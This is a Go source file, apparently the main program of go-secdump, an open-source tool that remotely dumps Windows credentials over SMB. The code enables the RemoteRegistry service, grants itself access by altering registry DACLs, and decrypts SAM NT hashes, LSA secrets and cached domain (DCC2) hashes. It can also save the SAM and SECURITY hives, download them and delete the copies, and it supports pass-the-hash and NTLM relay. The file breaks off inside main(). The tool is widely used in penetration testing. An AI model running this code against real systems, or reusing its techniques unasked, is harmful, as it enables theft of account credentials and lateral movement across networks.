// MIT License
//
// # Copyright (c) 2023 Jimmy Fjällid
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
package main

import (
	"bufio"
	"context"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	rundebug "runtime/debug"

	"golang.org/x/net/proxy"
	"golang.org/x/term"

	"github.com/jfjallid/go-smb/dcerpc"
	"github.com/jfjallid/go-smb/dcerpc/msrrp"
	"github.com/jfjallid/go-smb/dcerpc/msscmr"
	"github.com/jfjallid/go-smb/dcerpc/smbtransport"
	"github.com/jfjallid/go-smb/msdtyp"
	"github.com/jfjallid/go-smb/smb"
	"github.com/jfjallid/go-smb/smb/encoder"
	"github.com/jfjallid/go-smb/spnego"
	"github.com/jfjallid/golog"
)

var log = golog.Get("")
var release string = "0.6.0"

var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

// Local Administrators group SID
var administratorsSID string = "S-1-5-32-544"

// List of all registry keys changed with the order recorded
var registryKeysModified []string

// Map with all original security descriptors
var originalDacls map[string]*msdtyp.SecurityDescriptor

var samSecretList = []printableSecret{}
var lsaSecretList = []printableSecret{}
var dcc2SecretList = []printableSecret{}

var daclBackupFile *os.File
var outputFile *os.File

type printableSecret interface {
	printSecret(io.Writer)
}

type samAccount struct {
	name   string
	rid    uint32
	nthash string
}

func (s *samAccount) printSecret(out io.Writer) {
	if outputFile != nil {
		fmt.Fprintf(out, "%s:%d:%s\n", s.name, s.rid, s.nthash)
	} else {
		fmt.Fprintf(out, "Name: %s\n", s.name)
		fmt.Fprintf(out, "RID: %d\n", s.rid)
		fmt.Fprintf(out, "NT: %s\n\n", s.nthash)
	}
}

type dcc2Cache struct {
	domain string
	user   string
	cache  string
}

func (d *dcc2Cache) printSecret(out io.Writer) {
	fmt.Fprintln(out, d.cache)
}

func (s *printableLSASecret) printSecret(out io.Writer) {
	fmt.Fprintln(out, s.secretType)
	for _, item := range s.secrets {
		fmt.Fprintln(out, item)
	}
	if s.extraSecret != "" {
		fmt.Fprintln(out, s.extraSecret)
	}
}

func getRandString(n int) string {
	arr := make([]rune, n)
	for i := range arr {
		arr[i] = letters[rand.Intn(len(letters))]
	}
	return string(arr)
}

func isFlagSet(name string) bool {
	found := false
	flag.Visit(func(f *flag.Flag) {
		if f.Name == name {
			found = true
		}
	})
	return found
}

func startRemoteRegistry(session *smb.Connection, share string) (started, disabled bool, err error) {
	f, err := session.OpenFile(share, "svcctl")
	if err != nil {
		log.Errorln(err)
		return
	}
	defer f.CloseFile()
	transport, err := smbtransport.NewSMBTransport(f)
	if err != nil {
		log.Errorf("Failed to create SMB transport: %v\n", err)
	}

	bind, err := dcerpc.Bind(transport, msscmr.MSRPCUuidSvcCtl, msscmr.MSRPCSvcCtlMajorVersion, msscmr.MSRPCSvcCtlMinorVersion, dcerpc.MSRPCUuidNdr)
	if err != nil {
		log.Errorln("Failed to bind to service")
		log.Errorln(err)
		return
	}
	rpccon := msscmr.NewRPCCon(bind)

	serviceName := "RemoteRegistry"

	status, err := rpccon.GetServiceStatus(serviceName)
	if err != nil {
		log.Errorln(err)
		return
	}
	if status == msscmr.ServiceRunning {
		started = true
		disabled = false
		return
	}
	// Check if disabled
	config, err := rpccon.GetServiceConfig(serviceName)
	if err != nil {
		log.Errorf("Failed to get config of %s service with error: %v\n", serviceName, err)
		return started, disabled, err
	}
	if config.StartType == msscmr.StartTypeStatusMap[msscmr.ServiceDisabled] {
		disabled = true
		// Enable service
		err = rpccon.ChangeServiceConfig(serviceName, msscmr.ServiceNoChange, msscmr.ServiceDemandStart, msscmr.ServiceNoChange, "", "", "", "", "", "", 0)
		if err != nil {
			log.Errorf("Failed to change service config from Disabled to Start on Demand with error: %v\n", err)
			return started, disabled, err
		}
	}
	// Start service
	err = rpccon.StartService(serviceName, nil)
	if err != nil {
		log.Errorln(err)
		return started, disabled, err
	}
	time.Sleep(time.Second)
	return
}

func stopRemoteRegistry(session *smb.Connection, share string, disable bool) (err error) {
	log.Infoln("Trying to restore RemoteRegistry service status")
	f, err := session.OpenFile(share, "svcctl")
	if err != nil {
		log.Errorln(err)
		return
	}
	defer f.CloseFile()

	transport, err := smbtransport.NewSMBTransport(f)
	if err != nil {
		log.Errorf("Failed to create SMB transport: %v\n", err)
	}

	bind, err := dcerpc.Bind(transport, msscmr.MSRPCUuidSvcCtl, msscmr.MSRPCSvcCtlMajorVersion, msscmr.MSRPCSvcCtlMinorVersion, dcerpc.MSRPCUuidNdr)
	if err != nil {
		log.Errorln("Failed to bind to service")
		log.Errorln(err)
		return
	}
	rpccon := msscmr.NewRPCCon(bind)

	serviceName := "RemoteRegistry"

	// Stop service
	err = rpccon.ControlService(serviceName, msscmr.ServiceControlStop)
	if err != nil {
		log.Errorln(err)
		return
	}
	log.Infoln("Service RemoteRegistry stopped")

	if disable {
		err = rpccon.ChangeServiceConfig(serviceName, msscmr.ServiceNoChange, msscmr.ServiceDisabled, msscmr.ServiceNoChange, "", "", "", "", "", "", 0)
		if err != nil {
			log.Errorf("Failed to change service config to Disabled with error: %v\n", err)
			return
		}
		log.Infoln("Service RemoteRegistry disabled")
	}

	return
}

func changeDacl(rpccon *msrrp.RPCCon, base []byte, keys []string, sid string) error {
	if originalDacls == nil {
		originalDacls = make(map[string]*msdtyp.SecurityDescriptor)
	}

	for _, subkey := range keys {
		hSubKey, err := rpccon.OpenSubKey(base, subkey)
		if err != nil {
			if err == msrrp.ReturnCodeMap[msrrp.ErrorFileNotFound] {
				// Skip keys that do not exist
				continue
			}
			log.Errorln(err)
			return err
		}
		//Retrieving security settings
		sd, err := rpccon.GetKeySecurity(hSubKey)
		if err != nil {
			rpccon.CloseKeyHandle(hSubKey)
			log.Errorln(err)
			return err
		}
		sdBytes, err := sd.MarshalBinary()
		if err != nil {
			log.Errorln(err)
			return err
		}

		sd2 := msdtyp.SecurityDescriptor{
			OwnerSid: &msdtyp.SID{},
			GroupSid: &msdtyp.SID{},
			Sacl:     &msdtyp.PACL{},
			Dacl:     &msdtyp.PACL{},
		}
		err = sd2.UnmarshalBinary(sdBytes)
		if err != nil {
			log.Errorln(err)
			return err
		}
		// Check if key exists before adding to map.
		// Don't want to replace an existing key in case I change the ACL twice
		if _, ok := originalDacls[subkey]; !ok {
			originalDacls[subkey] = sd
			if daclBackupFile != nil {
				// Save new SD file
				sdBytes, err := encoder.Marshal(sd)
				if err != nil {
					log.Errorf("Failed to marshal SecurityDescriptor to bytes with error: %s\n", err)
				} else {
					sdHexBytes := hex.EncodeToString(sdBytes)
					_, err = daclBackupFile.WriteString(fmt.Sprintf("%s:%s\n", subkey, sdHexBytes))
					if err != nil {
						log.Errorf("Failed to write DACL to file with error: %s\n", err)
					}
				}
			}

		}

		mask := msrrp.PermWriteDacl | msrrp.PermReadControl | msrrp.PermKeyEnumerateSubKeys | msrrp.PermKeyQueryValue
		ace, err := msrrp.NewAce(sid, mask, msdtyp.AccessAllowedAceType, msdtyp.ContainerInheritAce)
		if err != nil {
			rpccon.CloseKeyHandle(hSubKey)
			delete(originalDacls, subkey)
			log.Errorln(err)
			return err
		}
		// NOTE Can't set owner, group or SACL, since I only have WriteDacl on SAM\SAM
		newSd, err := msrrp.NewSecurityDescriptor(sd.Control, nil, nil, msrrp.NewACL(append([]msdtyp.ACE{*ace}, sd.Dacl.ACLS...)), nil)

		log.Infof("Changing Dacl for key: %s\n", subkey)
		err = rpccon.SetKeySecurity(hSubKey, newSd)
		if err != nil {
			rpccon.CloseKeyHandle(hSubKey)
			delete(originalDacls, subkey)
			log.Errorln(err)
			return err
		}
		rpccon.CloseKeyHandle(hSubKey)
	}
	return nil
}

func revertDacl(rpccon *msrrp.RPCCon, base []byte, keys []string) error {
	if originalDacls == nil {
		err := fmt.Errorf("originalDacls map is not initialized, which indicates no DACL was changed yet")
		log.Errorln(err)
		return err
	}

	var sd *msdtyp.SecurityDescriptor
	var ok bool
	for _, subkey := range keys {
		if sd, ok = originalDacls[subkey]; !ok {
			log.Debugf("Trying to restore DACL of registry key %s, but the original DACL hasn't been saved.\nIt is likely that the registry key doesn't even exist\n", subkey)
			// Key did not exist so was not added to map
			continue
		}
		hSubKey, err := rpccon.OpenSubKey(base, subkey)
		if err != nil {
			log.Errorf("Tried to restore DACL of registry key %s, but failed to open registry key with error: %s\n", subkey, err)
			continue // Try to change as many keys as possible
		}

		sd.Control &^= msdtyp.SecurityDescriptorFlagSP
		sd.OffsetSacl = 0
		sd.OwnerSid = nil
		sd.GroupSid = nil
		sd.OffsetOwner = 0
		sd.OffsetGroup = 0

		err = rpccon.SetKeySecurity(hSubKey, sd)
		if err != nil {
			log.Errorln(err)
			rpccon.CloseKeyHandle(hSubKey)
			continue
		}
		log.Infof("Reverted Dacl for key: %s\n", subkey)
		rpccon.CloseKeyHandle(hSubKey)
	}
	return nil
}

func restoreDaclFromBackup(rpccon *msrrp.RPCCon, hKey []byte) error {
	daclMap := make(map[string]*msdtyp.SecurityDescriptor)
	keys := []string{}

	if daclBackupFile == nil {
		err := fmt.Errorf("Something went wrong with restoring DACLs from file. Backup file handle is nil")
		log.Errorln(err)
		return err
	}
	scanner := bufio.NewScanner(daclBackupFile)
	for scanner.Scan() {
		sd := msdtyp.SecurityDescriptor{
			OwnerSid: &msdtyp.SID{},
			GroupSid: &msdtyp.SID{},
			Sacl:     &msdtyp.PACL{},
			Dacl:     &msdtyp.PACL{},
		}
		line := scanner.Text()
		parts := strings.Split(line, ":")
		if len(parts) != 2 {
			err := fmt.Errorf("Expected lines to be of the format 'regkey:hexstring', but failed to parse string")
			log.Errorln(err)
			return err
		}
		sdBytes, err := hex.DecodeString(parts[1])
		if err != nil {
			log.Errorf("Failed to hex decode security descriptor bytes with error: %s\n", err)
			return err
		}
		err = sd.UnmarshalBinary(sdBytes)
		if err != nil {
			log.Errorf("Failed to unmarshal security descriptor bytes with error: %s\n", err)
			return err
		}
		daclMap[parts[0]] = &sd
		keys = append(keys, parts[0])
	}
	if err := scanner.Err(); err != nil {
		log.Errorln(err)
		return err
	}

	originalDacls = daclMap

	return tryRollbackChanges(rpccon, hKey, keys)
}

func tryRollbackChanges(rpccon *msrrp.RPCCon, hKey []byte, keys []string) error {
	if len(keys) == 0 {
		return nil
	}
	log.Infoln("Attempting to restore security descriptors")
	// Rollback changes in reverse order
	for i, j := 0, len(keys)-1; i < j; i, j = i+1, j-1 {
		keys[i], keys[j] = keys[j], keys[i]
	}
	err := revertDacl(rpccon, hKey, keys)
	if err != nil {
		log.Errorln(err)
		return err
	}
	return nil
}

func addToListIfNotExist(list *[]string, keys []string) []string {
	newKeys := []string{}
OuterLoop:
	for _, key := range keys {
		for _, k := range *list {
			if key == k {
				continue OuterLoop
			}
		}
		// Key was not already added to the list
		newKeys = append(newKeys, key)
	}
	// Add only if they do not already exist
	*list = append(*list, newKeys...)
	return newKeys
}

func dumpSAM(rpccon *msrrp.RPCCon, hKey []byte, modifyDacl bool) (err error) {

	keys := []string{
		`SAM\SAM`,
		`SAM\SAM\Domains`,
		`SAM\SAM\Domains\Account`,
		`SAM\SAM\Domains\Account\Users`,
	}
	if modifyDacl {
		registryKeysModified = append(registryKeysModified, keys...)
		// Grant temporarily higher permissions to the local administrators group
		err = changeDacl(rpccon, hKey, keys, administratorsSID)
		if err != nil {
			log.Errorln(err)
			return
		}
	}

	// Get RIDs of local users
	keyUsers := `SAM\SAM\Domains\Account\Users`
	var rids []string
	if modifyDacl {
		rids, err = rpccon.GetSubKeyNames(hKey, keyUsers)
	} else {
		rids, err = rpccon.GetSubKeyNamesExt(hKey, keyUsers, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
	}
	if err != nil {
		log.Errorln(err)
		return err
	}

	rids = rids[:len(rids)-1]
	for i := range rids {
		rids[i] = fmt.Sprintf("%s\\%s", keyUsers, rids[i])
	}

	if modifyDacl {
		// Extend the list of keys that have temporarily altered permissions
		registryKeysModified = append(registryKeysModified, rids...)
		// Grant temporarily higher permissions to the local administrators group
		err = changeDacl(rpccon, hKey, rids, administratorsSID)
		if err != nil {
			log.Errorln(err)
			return err
		}
	}

	syskey, err := getSysKey(rpccon, hKey, modifyDacl)
	if err != nil {
		log.Errorln(err)
		return err
	}

	// Gather credentials/secrets
	creds, err := getNTHash(rpccon, hKey, rids, modifyDacl)
	if err != nil {
		log.Errorln(err)
		// Try to get other secrets instead of hard fail
	} else {
		//TODO Rewrite handling of creds to not print to stdout until the end
		// Would be nice to be able to choose writing output to file, or somewhere else
		for _, cred := range creds {
			acc := samAccount{name: cred.Username, rid: cred.RID}
			//fmt.Printf("Name: %s\n", cred.Username)
			//fmt.Printf("RID: %d\n", cred.RID)
			if len(cred.Data) == 0 {
				//fmt.Printf("NT: <empty>\n\n")
				acc.nthash = "<empty>"
				samSecretList = append(samSecretList, &acc)
				continue
			}
			var hash []byte
			if cred.AES {
				hash, err = DecryptAESHash(cred.Data, cred.IV, syskey, cred.RID)
			} else {
				hash, err = DecryptRC4Hash(cred.Data, syskey, cred.RID)
			}
			acc.nthash = fmt.Sprintf("%x", hash)
			samSecretList = append(samSecretList, &acc)
			//fmt.Printf("NT: %x\n\n", hash)
		}
	}

	return nil
}

func dumpLSASecrets(rpccon *msrrp.RPCCon, hKey []byte, modifyDacl bool) (err error) {
	keys := []string{
		`SECURITY\Policy\Secrets`,
		`SECURITY\Policy\Secrets\NL$KM`,
		`SECURITY\Policy\Secrets\NL$KM\CurrVal`,
		`SECURITY\Policy\PolEKList`,
		`SECURITY\Policy\PolSecretEncryptionKey`,
	}

	if modifyDacl {
		registryKeysModified = append(registryKeysModified, keys...)

		// Grant temporarily higher permissions to the local administrators group
		err := changeDacl(rpccon, hKey, keys, administratorsSID)
		if err != nil {
			log.Errorln(err)
			return err
		}
	}

	// Get names of lsa secrets
	keySecrets := `SECURITY\Policy\Secrets`
	var secrets []string
	if modifyDacl {
		secrets, err = rpccon.GetSubKeyNames(hKey, keySecrets)
	} else {
		secrets, err = rpccon.GetSubKeyNamesExt(hKey, keySecrets, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
	}
	if err != nil {
		log.Errorln(err)
		return err
	}

	if modifyDacl {
		newSecrets := make([]string, 0, len(secrets)*2)
		for i := range secrets {
			newSecrets = append(newSecrets, fmt.Sprintf("%s\\%s", keySecrets, secrets[i]))
			newSecrets = append(newSecrets, fmt.Sprintf("%s\\%s\\%s", keySecrets, secrets[i], "CurrVal"))
		}

		newKeys := addToListIfNotExist(&registryKeysModified, newSecrets)
		err = changeDacl(rpccon, hKey, newKeys, administratorsSID)
		if err != nil {
			log.Errorln(err)
			return err
		}
	}

	lsaSecrets, err := GetLSASecrets(rpccon, hKey, false, modifyDacl)
	if err != nil {
		log.Noticeln("Failed to get lsa secrets")
		log.Errorln(err)
		return err
	}
	for i := range lsaSecrets {
		lsaSecretList = append(lsaSecretList, &lsaSecrets[i])
	}

	//if len(lsaSecrets) > 0 {
	//	fmt.Println("[*] LSA Secrets:")
	//	for _, secret := range lsaSecrets {
	//		fmt.Println(secret.secretType)
	//		for _, item := range secret.secrets {
	//			fmt.Println(item)
	//		}
	//		if secret.extraSecret != "" {
	//			fmt.Println(secret.extraSecret)
	//		}
	//	}
	//}

	return nil
}

func dumpDCC2Cache(rpccon *msrrp.RPCCon, hKey []byte, modifyDacl bool) error {
	keys := []string{
		`SECURITY\Policy\Secrets`,
		`SECURITY\Policy\Secrets\NL$KM`,
		`SECURITY\Policy\Secrets\NL$KM\CurrVal`,
		`SECURITY\Policy\PolEKList`,
		`SECURITY\Policy\PolSecretEncryptionKey`,
		`SECURITY\Cache`,
	}

	if modifyDacl {
		newKeys := addToListIfNotExist(&registryKeysModified, keys)
		// Grant temporarily higher permissions to the local administrators group
		err := changeDacl(rpccon, hKey, newKeys, administratorsSID)
		if err != nil {
			log.Errorln(err)
			return err
		}
	}

	cachedHashes, err := GetCachedHashes(rpccon, hKey, modifyDacl)
	if err != nil {
		log.Errorln(err)
		return err
	}

	for _, hash := range cachedHashes {
		userdomain := strings.Split(hash, ":")[0]
		parts := strings.Split(userdomain, "/")
		dcc2SecretList = append(dcc2SecretList, &dcc2Cache{domain: parts[0], user: parts[1], cache: hash})
	}

	//if len(cachedHashes) > 0 {
	//	//fmt.Println("[*] Dumping cached domain logon information (domain/username:hash)")
	//	for _, secret := range cachedHashes {
	//        userdomain := strings.Split(secret, ":")[0]
	//        parts := strings.Split(userdomain, "/")
	//        _ = dcc2Cache{
	//            domain: parts[0],
	//            user: parts[1],
	//            cache: secret,
	//        }
	//	}
	//}

	return nil
}

func downloadAndDeleteFile(session *smb.Connection, localFilename, remotePath string) (err error) {
	// Convert to valid remote path
	parts := strings.Split(remotePath, ":\\")
	if len(parts) > 1 {
		remotePath = parts[1]
	}

	f, err := os.OpenFile(localFilename, os.O_CREATE|os.O_TRUNC|os.O_RDWR, 0600)
	if err != nil {
		log.Errorln(err)
		return
	}
	defer f.Close()

	// Call library function to retrieve the file
	log.Infof("Trying to download remote file C:\\%s\n", remotePath)
	err = session.RetrieveFile("C$", remotePath, 0, f.Write)
	if err != nil {
		log.Errorf("Failed to retrieve remote file C:\\%s with error: %s\n", remotePath, err)
	} else {
		log.Infof("Successfully downloaded %s\n", remotePath)
	}

	// Remove the remote files
	log.Infof("Trying to delete remote file C:\\%s\n", remotePath)
	err = session.DeleteFile("C$", remotePath)
	if err != nil {
		log.Errorf("Failed to delete remote file C:\\%s with error: %s\n", remotePath, err)
		return
	} else {
		log.Infof("Successfully deleted remote file C:\\%s\n", remotePath)
	}

	return
}

func dumpOffline(session *smb.Connection, rpccon *msrrp.RPCCon, hKey []byte, dst string) (err error) {

	log.Infoln("Attempting to dump SAM and SECURITY hives to disk and then retrieve the files for local parsing using some other tool")
	windowsPath := strings.ReplaceAll(dst, "/", "\\")
	// Ensure the path ends with a backslash
	if !strings.HasSuffix(windowsPath, "\\") {
		windowsPath += "\\"
	}
	samPath := windowsPath + getRandString(7) + ".log"
	securityPath := windowsPath + getRandString(7) + ".log"

	// Dump SAM
	// Open a key handle
	hSubKey, err := rpccon.OpenSubKey(hKey, "SAM")
	if err != nil {
		log.Errorln(err)
		return
	}
	err = rpccon.RegSaveKey(hSubKey, samPath, "")
	if err != nil {
		log.Errorln(err)
		rpccon.CloseKeyHandle(hSubKey)
		return
	}
	rpccon.CloseKeyHandle(hSubKey)
	log.Infof("Dumped SAM hive to %s\n", samPath)

	// Retrieve the file
	err = downloadAndDeleteFile(session, "sam.dmp", samPath)
	if err != nil {
		log.Errorln(err)
		return
	}

	// Dump SECURITY
	// Open a key handle
	hSubKey, err = rpccon.OpenSubKey(hKey, "SECURITY")
	if err != nil {
		log.Errorln(err)
		return
	}
	err = rpccon.RegSaveKey(hSubKey, securityPath, "")
	if err != nil {
		log.Errorln(err)
		rpccon.CloseKeyHandle(hSubKey)
		return
	}
	rpccon.CloseKeyHandle(hSubKey)
	log.Infof("Dumped SECURITY hive to %s\n", securityPath)

	// Retrieve the file
	err = downloadAndDeleteFile(session, "security.dmp", securityPath)
	if err != nil {
		log.Errorln(err)
		return
	}

	// Dump the bootkey
	bootkey, err := getBootKey(rpccon, hKey)
	if err != nil {
		log.Errorf("Failed to extract the Bootkey from the SYSTEM hive with error: %s\n", err)
		return
	}

	fmt.Println("Downloaded SAM and SECURITY hives to local files sam.dmp and security.dmp")
	fmt.Printf("Bootkey for decrypting SAM and SECURITY hives: %x\n", bootkey)

	return nil
}

var helpMsg = `
    Usage: ` + os.Args[0] + ` [options]

    options:
          --host <target>        Hostname or ip address of remote server. Must be hostname when using Kerberos
      -P, --port <port>          SMB Port (default 445)
      -d, --domain <domain>      Domain name to use for login
      -u, --user <username>      Username
      -p, --pass <pass>          Password
      -n, --no-pass              Disable password prompt and send no credentials
          --hash <NT Hash>       Hex encoded NT Hash for user password
          --local                Authenticate as a local user instead of domain user
      -k, --kerberos             Use Kerberos authentication. (KRB5CCNAME will be checked on Linux)
          --dc-ip <ip>           Optionally specify ip of KDC when using Kerberos authentication
          --target-ip <ip>       Optionally specify ip of target when using Kerberos authentication
          --aes-key <hex>        Use a hex encoded AES128/256 key for Kerberos authentication
          --dns-host <ip[:port]> Override system's default DNS resolver
          --dns-tcp              Force DNS lookups over TCP. Default true when using --socks-host
          --dump                 Saves the SAM and SECURITY hives to disk and
                                 transfers them to the local machine.
          --sam                  Extract secrets from the SAM hive explicitly. Only other explicit targets are included.
          --lsa                  Extract LSA secrets explicitly. Only other explicit targets are included.
          --dcc2                 Extract DCC2 caches explicitly. Only other explicit targets are included.
          --modify-dacl          Change DACLs of reg keys before dump.
                                 Only required if keys cannot be opened using SeBackupPrivilege. (default false)
          --backup-dacl          Save original DACLs to disk before modification
          --restore-dacl         Restore DACLs using disk backup. Could be useful if automated restore fails.
          --backup-file <file>   Filename for DACL backup (default dacl.backup)
          --relay                Start an SMB listener that will relay incoming
                                 NTLM authentications to the remote server and
                                 use that connection. NOTE that this forces SMB 2.1
                                 without encryption.
          --relay-port <port>    Listening port for relay (default 445)
          --socks-host <target>  Establish connection via a SOCKS5 proxy server
          --socks-port <port>    SOCKS5 proxy port (default 1080)
      -t, --timeout <duration>   Dial timeout in format 5s or 2m (default 5s)
          --noenc                Disable smb encryption
          --smb2                 Force smb 2.1
          --debug                Enable debug logging
          --verbose              Enable verbose logging
      -o, --output <file>        Filename for writing results (default is stdout). Will append to file if it exists.
      -v, --version              Show version
`

func main() {
	var host, username, password, hash, domain, socksHost, backupFilename, outputFilename, targetIP, dcIP, aesKey, dnsHost string
	var port, socksPort, relayPort int
	var debug, noEnc, forceSMB2, localUser, dump, version, verbose, relay, noPass, sam, lsaSecrets, dcc2, modifyDacl, backupDacl, restoreDacl, kerberos, dnsTCP bool
	var dialTimeout time.Duration
	var err error

	flag.Usage = func() {
		fmt.Println(helpMsg)
		os.Exit(0)
	}

	flag.StringVar(&host, "host", "", "")
	flag.StringVar(&username, "u", "", "")
	flag.StringVar(&username, "user", "", "")
	flag.StringVar(&password, "p", "", "")
	flag.StringVar(&password, "pass", "", "")
	flag.StringVar(&hash, "hash", "", "")
	flag.StringVar(&domain, "d", "", "")
	flag.StringVar(&domain, "domain", "", "")
	flag.IntVar(&port, "P", 445, "")
	flag.IntVar(&port, "port", 445, "")
	flag.BoolVar(&debug, "debug", false, "")
	flag.BoolVar(&verbose, "verbose", false, "")
	flag.BoolVar(&noEnc, "noenc", false, "")
	flag.BoolVar(&forceSMB2, "smb2", false, "")
	flag.BoolVar(&localUser, "local", false, "")
	flag.BoolVar(&dump, "dump", false, "")
	flag.DurationVar(&dialTimeout, "t", time.Second*5, "")
	flag.DurationVar(&dialTimeout, "timeout", time.Second*5, "")
	flag.BoolVar(&version, "v", false, "")
	flag.BoolVar(&version, "version", false, "")
	flag.BoolVar(&relay, "relay", false, "")
	flag.IntVar(&relayPort, "relay-port", 445, "")
	flag.StringVar(&socksHost, "socks-host", "", "")
	flag.IntVar(&socksPort, "socks-port", 1080, "")
	flag.BoolVar(&noPass, "no-pass", false, "")
	flag.BoolVar(&noPass, "n", false, "")
	flag.BoolVar(&sam, "sam", false, "")
	flag.BoolVar(&lsaSecrets, "lsa", false, "")
	flag.BoolVar(&dcc2, "dcc2", false, "")
	flag.BoolVar(&modifyDacl, "modify-dacl", false, "")
	flag.BoolVar(&backupDacl, "backup-dacl", false, "")
	flag.BoolVar(&restoreDacl, "restore-dacl", false, "")
	flag.StringVar(&backupFilename, "backup-file", "dacl.backup", "")
	flag.StringVar(&outputFilename, "o", "", "")
	flag.StringVar(&outputFilename, "output", "", "")
	flag.BoolVar(&kerberos, "k", false, "")
	flag.BoolVar(&kerberos, "kerberos", false, "")
	flag.StringVar(&targetIP, "target-ip", "", "")
	flag.StringVar(&dcIP, "dc-ip", "", "")
	flag.StringVar(&aesKey, "aes-key", "", "")
	flag.StringVar(&dnsHost, "dns-host", "", "")
	flag.BoolVar(&dnsTCP, "dns-tcp", false, "")

	flag.Parse()

	if debug {
		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/spnego", "spnego", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/dcerpc", "dcerpc", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/dcerpc/msrrp", "msrrp", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/dcerpc/msscmr", "msscmr", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/krb5ssp", "krb5ssp", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		log.SetFlags(golog.LstdFlags | golog.Lshortfile)
		log.SetLogLevel(golog.LevelDebug)
	} else if verbose {
		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/spnego", "spnego", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/dcerpc", "dcerpc", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/dcerpc/msrrp", "msrrp", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/dcerpc/msscmr", "msscmr", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/krb5ssp", "krb5ssp", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		log.SetFlags(golog.LstdFlags | golog.Lshortfile)
		log.SetLogLevel(golog.LevelInfo)
	} else {
		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelNotice, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/spnego", "spnego", golog.LevelNotice, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelNotice, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/dcerpc", "dcerpc", golog.LevelNotice, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/dcerpc/msrrp", "msrrp", golog.LevelNotice, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/dcerpc/msscmr", "msscmr", golog.LevelNotice, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/krb5ssp", "krb5ssp", golog.LevelNotice, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
	}

	if version {
		fmt.Printf("Version: %s\n", release)
		bi, ok := rundebug.ReadBuildInfo()
		if !ok {
			log.Errorln("Failed to read build info to locate version imported modules")
		}
		for _, m := range bi.Deps {
			fmt.Printf("Package: %s, Version: %s\n", m.Path, m.Version)
		}
		return
	}

	if !sam && !lsaSecrets && !dcc2 {
		// If no individual target to dump is set, dump everything
		sam = true
		lsaSecrets = true
		dcc2 = true
	}

	if backupDacl && restoreDacl {
		log.Errorln("Can't specify both --backup-dacl and --restore-dacl at the same time.")
		flag.Usage()
		return
	}

	if backupDacl {
		daclBackupFile, err = os.OpenFile(backupFilename, os.O_RDWR|os.O_CREATE|os.O_EXCL, 0600)
		if err != nil {
			log.Errorf("Failed to create local file %s to store original DACLs before modification with error: %s\n", backupFilename, err)
			return
		}
		defer daclBackupFile.Close()
	} else if restoreDacl {
